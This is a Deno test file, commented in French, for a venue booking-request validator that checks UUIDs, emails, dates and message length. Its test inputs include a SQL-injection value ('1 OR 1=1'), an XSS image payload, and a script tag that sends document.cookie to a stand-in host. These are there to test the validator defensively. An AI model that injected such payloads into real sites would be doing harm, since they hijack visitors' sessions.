import { assertEquals } from "https://deno.land/std@0.224.0/assert/mod.ts";
import { validateLead } from "./lead.ts";

const base = {
  kind: "generic",
  full_name: "Adjoua Konan",
  email: "adjoua@exemple.test",
  message: "Bonjour, je souhaite réserver une table pour samedi soir.",
};

Deno.test("accepte une demande complète", () => {
  const r = validateLead({
    ...base,
    place_id: "11111111-0000-4000-8000-000000000001",
    phone: "+225 07 07 07 07 07",
    party_size: "4",
    date_from: "2026-09-01",
    date_to: "2026-09-03",
    budget: "50 000 FCFA",
  });
  assertEquals(r.ok, true);
  if (r.ok) {
    assertEquals(r.data.party_size, 4);
    assertEquals(r.data.date_from, "2026-09-01");
  }
});

Deno.test("refuse un identifiant d'établissement qui n'est pas un uuid", () => {
  const r = validateLead({ ...base, place_id: "1 OR 1=1" });
  assertEquals(r.ok, false);
});

Deno.test("refuse une adresse email malformée", () => {
  assertEquals(validateLead({ ...base, email: "adjoua(at)exemple" }).ok, false);
});

Deno.test("refuse un type de demande inconnu", () => {
  assertEquals(validateLead({ ...base, kind: "admin" }).ok, false);
});

Deno.test("refuse un message hors bornes", () => {
  assertEquals(validateLead({ ...base, message: "ok" }).ok, false);
  assertEquals(validateLead({ ...base, message: "x".repeat(2001) }).ok, false);
});

Deno.test("refuse un nombre de personnes non numérique", () => {
  assertEquals(validateLead({ ...base, party_size: "beaucoup" }).ok, false);
  assertEquals(validateLead({ ...base, party_size: 0 }).ok, false);
});

Deno.test("refuse une date inexistante et un intervalle inversé", () => {
  assertEquals(validateLead({ ...base, date_from: "2026-02-31" }).ok, false);
  assertEquals(
    validateLead({ ...base, date_from: "2026-09-10", date_to: "2026-09-01" }).ok,
    false,
  );
});

Deno.test("la validation laisse passer le texte du visiteur sans le mutiler", () => {
  const r = validateLead({
    ...base,
    full_name: "<img src=x onerror=alert(1)>",
    message: "Bonjour <script>fetch('https://voleur.test?c='+document.cookie)</script> merci",
  });
  assertEquals(r.ok, true);
  if (!r.ok) return;
  // Le balisage est desormais echappe par le porteur, qui applique escapeHtml
  // au sujet comme au corps. Ce qui se verifie ici est que la validation
  // laisse passer le texte sans le mutiler : c'est elle qui decide ce qui
  // entre en base.
  assertEquals(r.data.full_name.includes("<img"), true);
  assertEquals(r.data.message.includes("<script>"), true);
});

